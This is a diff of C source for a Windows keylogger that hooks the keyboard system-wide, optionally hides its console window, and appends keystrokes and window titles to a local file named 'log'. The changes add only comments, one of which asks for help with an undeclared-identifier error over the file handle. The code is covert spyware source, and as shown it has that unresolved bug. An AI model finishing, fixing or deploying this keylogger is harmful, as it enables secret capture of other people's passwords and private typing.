@@ -9,7 +9,7 @@
 
 #define hidden    //hidden/visible
 
-const char* keyname[] = {
+const char* keyname[] = {   //establish keynames
     [VK_BACK] = "[BACKSPACE]",
     [VK_RETURN] = "\n",
     [VK_SPACE] = "_",
@@ -71,11 +71,11 @@ void ReleaseHook()
     UnhookWindowsHookEx(_hook);
 }
 
-int save(int key_stroke) {
+int save(int key_stroke) { //save to file
     FILE* outputtext;
     char output[1024];
     static char lastwindow[256] = "";
-    if ((key_stroke == 1) || (key_stroke == 2))
+	if ((key_stroke == 1) || (key_stroke == 2))      //ignore mouse clicks
     {
         return 0;
     }
@@ -119,8 +119,8 @@ int save(int key_stroke) {
         }
         sprintf_s(output, sizeof(output), "%c", key);
     }
-    fputs(output, outputtext); 
-    fflush(outputtext);
+	fputs(output, outputtext); //says that outputtext is an undeclared identifier but it's declared in main and in this function, maybe it's because it's decalred twice? IDk why that 
+	fflush(outputtext);        //would be a problem but I'm not sure what else it could be. Please help me figure this out. 
     printf("%s", output);
     return 0;
 }
@@ -136,12 +136,15 @@ void visibility() {
 }
 
 int main() {
-    visibility();
+    //hide or show console window
+    visibility();   
     
-    const char* keylog = "log";
+    //file output
+    const char* keylog = "log";                 
     printf("Logging output to %s\n", keylog);
     FILE* outputtext = fopen(keylog, "a");
     
+    //system hook 
     SetHook();
     
     MSG msg; 
@@ -149,6 +152,8 @@ int main() {
     {
     }
 
+	//close file
     fclose(outputtext);
+    
     return 0;
 }
